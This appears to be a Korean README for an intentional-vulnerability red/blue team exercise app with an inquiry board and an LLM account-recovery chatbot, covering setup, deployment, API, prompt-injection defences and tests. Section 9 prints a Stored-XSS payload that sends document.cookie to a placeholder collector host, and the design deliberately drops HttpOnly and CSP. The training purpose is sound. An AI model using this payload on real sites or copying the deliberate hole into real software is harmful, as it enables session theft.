# BlueCell — Episode 1 : 감염된 챗봇

`CoC (Blue).pdf` 의 Blue 팀 작전 지침을 그대로 구현한 웹서비스입니다.
계정 게이트 · 1:1 문의 게시판 · 계정복구 상담 챗봇 + 전체 REST API 를 포함합니다.

> **훈련용 타겟입니다.** 명세가 지정한 Stored-XSS 한 곳만 의도적으로 열려 있습니다.
> 그 외 입력·인증·권한·데이터 접근 흐름은 전부 막혀 있어야 하며, 자동 점검으로 확인합니다.

---

## 1. 빠른 시작

```bash
npm install
cp .env.example .env      # 이미 있으면 생략
npm start                 # http://localhost:3000
```

첫 실행 시 관리자/일반 유저 계정이 자동으로 시드됩니다.

| 역할 | 아이디 | 비밀번호 | 이메일 |
|---|---|---|---|
| 관리자 | `admin` | `Admin!2345` | `admin@bluecell.local` |
| 일반 유저 | `user` | `User!2345` | `user@bluecell.local` |

계정 정보는 `.env` 의 `SEED_*` 값으로 바꾼 뒤 `npm run seed` 로 갱신합니다.

> **미션 전 권장 조치:** 챗봇 신원 확인은 명세상 *아이디 + 이메일 일치* 만으로 통과합니다.
> `admin@bluecell.local` 처럼 추측 가능한 관리자 이메일을 그대로 두면 Red 가 챗봇으로
> 관리자 재설정 토큰을 받아갈 수 있습니다. `SEED_ADMIN_EMAIL` 을 추측 불가능한 값으로 바꾸세요.

---

## 2. WSL 에서 띄우고 Windows 호스트에서 접속하기

서버는 `HOST=0.0.0.0` 으로 바인딩되므로 아래 세 경로 모두 열립니다.

```bash
npm run whereami     # 내 환경에 맞는 접속 주소를 계산해서 출력
```

### ① Windows 브라우저에서 그냥 localhost

WSL2 는 localhost 를 자동 포워딩합니다. **대부분 이걸로 끝납니다.**

```
http://localhost:3000
```

### ② localhost 포워딩이 안 될 때 — WSL IP 직접 지정

```bash
hostname -I | awk '{print $1}'      # 예: 172.25.109.130
```

```
http://172.25.109.130:3000
```

> WSL 을 재시작하면 이 IP 가 바뀝니다. 매번 위 명령으로 다시 확인하세요.

### ③ 같은 공유기의 다른 기기(폰, 팀원 노트북)에서 접속

Windows 는 WSL 포트를 LAN 에 자동 공개하지 않습니다. **관리자 PowerShell** 에서 포트프록시와 방화벽을 한 번 열어줍니다.

```powershell
# WSL IP 확인
wsl hostname -I

# 포트 포워딩 (connectaddress 에 위에서 확인한 WSL IP)
netsh interface portproxy add v4tov4 listenport=3000 listenaddress=0.0.0.0 connectport=3000 connectaddress=172.25.109.130

# 방화벽 인바운드 허용
New-NetFirewallRule -DisplayName "BlueCell 3000" -Direction Inbound -LocalPort 3000 -Protocol TCP -Action Allow

# 확인 / 해제
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=3000 listenaddress=0.0.0.0
```

이제 같은 네트워크에서 `http://<Windows IP>:3000` 으로 접속됩니다 (`ipconfig` 로 확인).

### ④ 어디서나 접속 가능한 주소로 배포 (DEPLOYMENT EXIT)

가장 빠른 방법은 터널입니다. WSL 안에서 실행하세요.

```bash
# Cloudflare Tunnel (계정 불필요)
cloudflared tunnel --url http://localhost:3000

# 또는 ngrok
ngrok http 3000
```

**터널/리버스 프록시 뒤에 둘 때는 반드시 `.env` 를 수정하세요.**

```ini
TRUST_PROXY_HOPS=1      # 프록시 1단 신뢰 → X-Forwarded-For 로 실제 공인 IP 판정
COOKIE_SECURE=true      # HTTPS 로 서비스할 때
NODE_ENV=production
```

`TRUST_PROXY_HOPS=0`(기본값)이면 `X-Forwarded-For` 를 **완전히 무시**합니다.
프록시 뒤에서 0으로 두면 모든 접속자가 프록시 IP 하나로 보여 세션 IP 바인딩이 무력화되고,
반대로 프록시 없이 1 이상으로 두면 공격자가 헤더를 위조해 바인딩을 우회할 수 있습니다.
**실제 구성과 정확히 맞추세요.**

---

## 3. LLM 연결 (MODEL LOCK)

명세의 모델 **`llama-3.2-3b-instruct`** 가 코드에 고정되어 있습니다.
서빙 환경마다 모델 ID 표기가 다르므로 `LLM_MODEL_ID` 로 **표기만** 바꿀 수 있고,
Llama 3.2 3B 계열이 아니면 **서버가 기동 자체를 거부**합니다.

```
$ LLM_MODEL_ID=gpt-4o-mini npm start
Error: MODEL LOCK 위반: LLM_MODEL_ID="gpt-4o-mini" 는 llama-3.2-3b-instruct 이 아닙니다.
```

### OpenRouter (기본 설정)

1. <https://openrouter.ai/keys> 에서 API 키 발급
2. `.env` 의 `LLM_API_KEY` 에 붙여넣기

```ini
LLM_BASE_URL=https://openrouter.ai/api/v1
LLM_API_KEY=sk-or-v1-...
LLM_MODEL_ID=meta-llama/llama-3.2-3b-instruct
```

비용은 100만 토큰당 입력 $0.05 / 출력 $0.33 로, 2시간 미션이면 몇 센트 수준입니다.
무료로 쓰려면 `LLM_MODEL_ID=meta-llama/llama-3.2-3b-instruct:free` 로 바꿉니다 (대기열이 있어 느립니다).

키가 비어 있으면 부팅 시 경고가 뜹니다.

```
LLM        NO KEY  https://openrouter.ai/api/v1
⚠  .env 의 LLM_API_KEY 가 비어 있습니다.
```

### 연결 확인

```bash
curl -s http://localhost:3000/api/chat/_/health | python3 -m json.tool
```

```json
{ "ok": true, "model": "llama-3.2-3b-instruct",
  "modelId": "meta-llama/llama-3.2-3b-instruct", "loaded": true }
```

`/chat` 화면 상단에도 **온라인** 표시로 나타납니다.
`loaded:false` 면 그 ID 를 공급자 카탈로그에서 못 찾은 것이며, 응답의 `candidates` 에 후보 ID 가 함께 옵니다.

### 다른 공급자로 바꾸려면

`LLM_BASE_URL` · `LLM_API_KEY` · `LLM_MODEL_ID` 세 줄만 바꾸면 됩니다.
OpenAI 호환 `/chat/completions` 엔드포인트면 무엇이든 붙습니다.

| 환경 | `LLM_BASE_URL` | `LLM_MODEL_ID` | 키 |
|---|---|---|---|
| OpenRouter | `https://openrouter.ai/api/v1` | `meta-llama/llama-3.2-3b-instruct` | 필요 |
| Together AI | `https://api.together.xyz/v1` | `meta-llama/Llama-3.2-3B-Instruct-Turbo` | 필요 |
| LM Studio (로컬) | `http://localhost:1234/v1` | `llama-3.2-3b-instruct` | 불필요 |
| Ollama (로컬) | `http://localhost:11434/v1` | `llama3.2:3b-instruct-q4_K_M` | 불필요 |

> 클라우드 공급자의 모델 카탈로그는 수시로 바뀝니다. 콘솔에서 정확한 ID 를 확인해 복사하세요.
> 키는 `.env` 에만 두고 커밋하지 마세요 (`.gitignore` 에 포함되어 있습니다).

### 폴백

`ALLOW_LLM_FALLBACK=true`(기본값)이면 LLM 호출이 실패해도 규칙 기반 로직으로 계속 동작하고,
챗봇 응답에 `llm:false` 가 표시됩니다. **미션 제출 시에는 `false` 로 두세요.**

---

## 4. Railway 배포 (DEPLOYMENT EXIT)

### 1) GitHub 에 올리기

`.env` 는 `.gitignore` 에 있으므로 **API 키는 커밋되지 않습니다.** 키는 Railway 대시보드에서 따로 넣습니다.

```bash
git init
git add -A
git commit -m "BlueCell support service"
git branch -M main
git remote add origin https://github.com/<계정>/<저장소>.git
git push -u origin main
```

### 2) Railway 프로젝트 생성

1. <https://railway.app> → **New Project** → **Deploy from GitHub repo** → 이 저장소 선택
2. Nixpacks 가 `package.json` 을 읽어 자동 빌드합니다 (`railway.json` 에 빌드·헬스체크 설정 포함)
3. **Settings → Networking → Generate Domain** 으로 공개 주소 발급

### 3) 환경변수 (Variables 탭) — 필수

```ini
NODE_ENV=production
TRUST_PROXY_HOPS=1
COOKIE_SECURE=true

LLM_BASE_URL=https://openrouter.ai/api/v1
LLM_API_KEY=sk-or-v1-...            ← 발급받은 키
LLM_MODEL_ID=meta-llama/llama-3.2-3b-instruct
ALLOW_LLM_FALLBACK=false

DB_FILE=/data/app.db                ← 아래 볼륨과 짝

SEED_ADMIN_USER=admin
SEED_ADMIN_PASS=<추측 불가능한 값으로>
SEED_ADMIN_EMAIL=<추측 불가능한 값으로>
SEED_USER_USER=user
SEED_USER_PASS=<추측 불가능한 값으로>
SEED_USER_EMAIL=user@example.com
```

> `PORT` 는 Railway 가 자동 주입하므로 **설정하지 마세요.**

**`TRUST_PROXY_HOPS=1` 은 반드시 넣어야 합니다.** Railway 는 리버스 프록시 뒤에서 동작하므로,
이 값이 0이면 모든 접속자가 프록시 IP 하나로 보여 **명세 02 의 "세션 재활용 경계"가 무력화**됩니다.
빠뜨리면 부팅 로그에 경고가 찍힙니다.

### 4) 볼륨 (권장)

Railway 컨테이너 파일시스템은 재배포 시 초기화됩니다. 볼륨이 없으면 Red 가 작성한 문의글이
배포·재시작 때마다 사라집니다.

**Settings → Volumes → New Volume**, 마운트 경로 `/data` → 환경변수 `DB_FILE=/data/app.db`

계정은 부팅 시 자동으로 다시 시드되므로 볼륨 없이도 서비스는 뜹니다.

### 5) 배포 확인

```bash
curl -s https://<앱>.up.railway.app/healthz
curl -s https://<앱>.up.railway.app/api/chat/_/health
```

배포 로그에서 아래 세 줄을 확인하세요.

```
  Proxy hops 1
  LLM        ONLINE  https://openrouter.ai/api/v1
  (⚠ 경고가 없어야 정상)
```

그다음 브라우저에서 관리자·일반 유저 로그인, 문의 작성/열람, 챗봇 토큰 발급까지 직접 확인합니다.

### 배포 후 주의

- 이 서비스에는 **의도된 Stored-XSS** 가 있습니다. 공개 주소는 미션 중에만 열어두고,
  종료 후 Railway 프로젝트를 삭제하거나 도메인을 내리세요.
- OpenRouter 키는 미션 종료 후 콘솔에서 폐기하세요.

---

## 5. 화면

| 경로 | 설명 |
|---|---|
| `/` | 홈. 현재 공인 IP · 세션 · 모델 락 상태 |
| `/register` | 회원가입 (아이디·비밀번호·이메일만, 추가 인증 없음) |
| `/login` | 로그인 |
| `/reset` | 비밀번호 재설정 — **재설정 토큰만** 입력 |
| `/chat` | 고객상담 챗봇 |
| `/inquiries` | 1:1 문의 목록 (관리자=전체, 유저=본인 글) |
| `/inquiries/new` | 문의 작성 |
| `/inquiries/:id` | 문의 상세 — **지정된 Stored-XSS 지점** |
| `/admin` | 관리자 콘솔 (계정·세션 바인딩 IP·감사 로그) |

관리자로 로그인하면 우측 상단에 붉은 `◆ ADMINISTRATOR` 배지가 표시됩니다 (ACCOUNT SIGNAL).

---

## 6. API

인증은 `bc_session` 쿠키. 모든 응답은 JSON.

### Auth

| Method | Path | 설명 |
|---|---|---|
| POST | `/api/auth/register` | `{username, password, email}` → 201, 세션 즉시 발급 |
| POST | `/api/auth/login` | `{username, password}` |
| POST | `/api/auth/logout` | 세션 폐기 |
| GET | `/api/auth/me` | 현재 사용자 + `isAdmin` + `clientIp` |
| POST | `/api/auth/reset` | `{token, password}` — 토큰만으로 비밀번호 변경 |
| GET | `/api/auth/reset/check?token=` | 토큰 유효성만 확인 (계정 정보 비노출) |
| GET | `/api/auth/sessions` | 내 세션 목록 + 바인딩 IP |

### Inquiries — 관리자 또는 작성자 본인만

| Method | Path | 설명 |
|---|---|---|
| GET | `/api/inquiries` | 관리자=전체(`scope:"all"`), 유저=본인(`scope:"own"`) |
| POST | `/api/inquiries` | `{title, body}` |
| GET | `/api/inquiries/:id` | 상세 + 답변. 권한 없으면 **404** (존재 여부 비노출) |
| POST | `/api/inquiries/:id/replies` | `{body}` |
| PATCH | `/api/inquiries/:id` | `{status}` — 관리자 전용 |
| DELETE | `/api/inquiries/:id` | 작성자 본인 또는 관리자 |

### Chat

| Method | Path | 설명 |
|---|---|---|
| POST | `/api/chat/session` | 새 상담 시작 → `{chatId, greeting}` |
| POST | `/api/chat/message` | `{chatId, message}` → `{reply, stage, ended, llm, model}` |
| GET | `/api/chat/:chatId` | 대화 이력 |
| GET | `/api/chat/_/health` | LLM 연결 · 모델 로드 상태 |

`stage`: `INTENT` → `USERNAME` → `EMAIL` → `DONE` / `ENDED`

### Admin — 관리자 전용

`GET /api/admin/users` · `/sessions` · `/audit` · `/stats`

### 기타

`GET /healthz`

---

## 7. 명세 대응표

### 01 / ACCESS GATE
- 회원가입은 아이디·비밀번호·이메일만 입력받고 **이메일 인증·추가 인증을 수행하지 않습니다.**
- 가입한 계정으로 즉시 로그인 가능.
- 비밀번호 재설정 화면은 **재설정 토큰만** 입력받습니다 (아이디·이메일 입력란 없음).
- 유효한 토큰만으로 새 비밀번호를 설정할 수 있습니다.
- 관리자 로그인 시 우측 상단에 관리자 표식 노출.
- 계정 인벤토리: 관리자 1개, 일반 유저 1개. (Red 는 직접 가입)

### 02 / INQUIRY NODE
- 사용자가 1:1 문의글을 작성할 수 있습니다.
- **관리자 계정과 해당 작성자만** 열람 가능. 제3자에게는 목록·상세 모두 노출되지 않고 404 로 응답합니다.
- **지정된 Stored-XSS**: 문의 **본문**은 이스케이프 없이 렌더링됩니다 (`src/views/inquiries/detail.ejs`).
  관리자가 페이로드가 포함된 글을 열람하면 `document.cookie` 로 세션 토큰이 탈취됩니다
  (이를 위해 세션 쿠키는 의도적으로 `HttpOnly` 가 아니며, CSP 도 설정하지 않습니다).
- **세션 재활용 경계**: 세션은 발급 시점의 공인 IP 에 바인딩됩니다.
  탈취한 세션은 **같은 공인 IP 에서만** 재활용 가능하고, 다른 공인 IP 에서는 무효 처리됩니다
  (`reason: "ip_mismatch"`, 쿠키 즉시 제거, 감사 로그 기록).

### 03 / CUSTOMER BOT
- 봇이 먼저 `무엇을 도와드릴까요?` 라고 질문합니다.
- 첫 응답이 계정 복구와 무관하면 `상담챗봇의 처리 사항이 아닙니다` 로 응답하고 종료합니다.
- 계정 복구면 **아이디 → 이메일** 순서로 신원을 확인합니다.
- 가입 시 제출한 아이디와 이메일이 **모두 일치할 경우에만** 해당 계정의 재설정 토큰을 알려줍니다.
- 토큰 전달 응답은 **반드시 LLM 을 통해** 생성되며, 해당 프롬프트에는 **입력받은 아이디와 이메일이 반드시 포함**됩니다
  (`llmVerdictReply()` 의 `VERIFICATION` 블록).
- 모델은 `llama-3.2-3b-instruct` 고정.

### 04 / PROMPT FIREWALL
- **판정 권한은 LLM 에 없습니다.** 아이디·이메일 일치 판정은 100% 서버 로직(`verifyIdentity()`)이 DB 대조로 수행하고,
  LLM 에는 확정된 `MATCH` / `MISMATCH` 결과만 전달합니다.
- **검증 실패 시 토큰은 프롬프트에 아예 들어가지 않습니다.** 프롬프트에 없으면 유출될 수 없습니다.
- 입력 위생 처리: 길이 제한, 제어문자·양방향 위조문자 제거, chat template 특수 토큰(`<|...|>`) 차단,
  구분자 위조 차단, 신뢰 불가 데이터 블록으로 격리.
- 출력 위생 처리: 허용된 토큰 외에 토큰 형태 문자열은 모두 `[REDACTED]`,
  시스템 프롬프트 유출 흔적 감지 시 안전 문구로 대체,
  검증 실패인데 모델이 "확인 완료" 라고 답하면 무조건 거부 문구로 대체.
- 인젝션 시도는 `chat.injection_attempt` 로 감사 로그에 남습니다.
- 신원 확인 시도 5회 초과 시 상담 종료.

### IMPLEMENTATION GUARDRAIL (지정 XSS 외 차단)
- 모든 SQL 은 prepared statement (문자열 결합 없음).
- 비밀번호는 bcrypt cost 12.
- 재설정 토큰은 128bit CSPRNG, 30분 만료, **1회용**(원자적 소비), 형식 불일치 시 DB 조회조차 안 함.
- 비밀번호 변경 시 해당 계정의 기존 세션 전부 무효화.
- 문의 **제목**과 답변, 그 외 모든 출력은 이스케이프됩니다 — XSS 표면은 본문 하나로 한정됩니다.
- 매스 어사인먼트 차단(`author_id` 위조 불가), 오픈 리다이렉트 차단, 로그인 응답의 계정 존재 여부 비노출.
- 로그인/가입/재설정/문의작성/챗봇에 레이트 리밋.
- CSP 는 지정 XSS 동작을 위해 설정하지 않되, `X-Content-Type-Options` · `X-Frame-Options` · `Referrer-Policy` 는 적용.

---

## 8. 자동 점검

명세 항목을 전부 실제 HTTP 요청으로 검증합니다.

```bash
# 1) 앱 실행 (기본 인스턴스)
npm start

# 2) 세션 IP 바인딩 시나리오용 프록시 모드 인스턴스
PORT=3100 TRUST_PROXY_HOPS=1 npm start

# 3) 전체 명세 점검 (61항목)
CHAT_RATE_MAX=400 npm start      # 점검 시에는 챗봇 레이트리밋을 올려두세요
npm test
```

LLM 경로(모델 락 · 프롬프트 내용 · 출력 위생)는 목 서버로 검증합니다.

```bash
npm run mock-llm &                                        # :1234 에 가짜 llama-3.2-3b-instruct
PORT=3200 ALLOW_LLM_FALLBACK=false CHAT_RATE_MAX=400 npm start &
BASE=http://localhost:3200 npm run test:llm               # 13항목

# 토큰을 지어내고 시스템 프롬프트를 흘리는 악성 모델 시뮬레이션
MOCK_MODE=leak npm run mock-llm
```

현재 상태: **명세 점검 61/61 PASS, LLM 경로 13/13 PASS.**

---

## 9. XSS 시나리오 수동 확인

1. Red 계정으로 가입 → `/inquiries/new` 에서 본문에 페이로드 작성
   ```html
   <img src=x onerror="fetch('https://<수집서버>/c?c='+encodeURIComponent(document.cookie))">
   ```
2. Red 가 Blue 에게 열람을 요청 → 관리자로 `/inquiries/:id` 열람 → 관리자 세션 쿠키가 전송됨
3. 탈취한 `bc_session` 값을 **같은 공인 IP** 에서 쿠키로 넣으면 관리자로 동작
4. **다른 공인 IP** 에서 같은 값을 쓰면 401 `ip_mismatch` 로 거부
5. 무효 처리 기록은 `/admin` 감사 로그의 `session.ip_mismatch` 에서 확인

---

## 10. 구조

```
src/
  server.js               앱 부트스트랩, 헤더, 라우터 마운트
  config.js               설정 + MODEL LOCK 하드코딩
  db.js                   SQLite 스키마 + 감사 로그
  seed.js                 관리자/일반 유저 시드
  middleware/auth.js      세션 해석, requireAuth / requireAdmin
  services/
    net.js                공인 IP 판정 (X-Forwarded-For 신뢰 정책)
    sessions.js           세션 발급 + IP 바인딩 검증
    tokens.js             재설정 토큰 발급/1회 소비
    validate.js           입력 검증
    llm.js                OpenAI 호환 클라이언트 (모델 고정)
    chatbot.js            상태 기계 + 프롬프트 파이어월
  routes/
    pages.js              화면 라우트
    api-auth.js  api-inquiries.js  api-chat.js  api-admin.js
  views/                  EJS 템플릿
  public/                 CSS / 클라이언트 JS
test/
  coc-check.js            명세 자동 점검
  llm-path-check.js       LLM 경로 검증
  mock-llm.js             가짜 llama-3.2-3b-instruct
scripts/whereami.sh       접속 주소 안내
```

데이터는 `data/app.db` (SQLite). 초기화는 `npm run reset-db` 후 재시작.
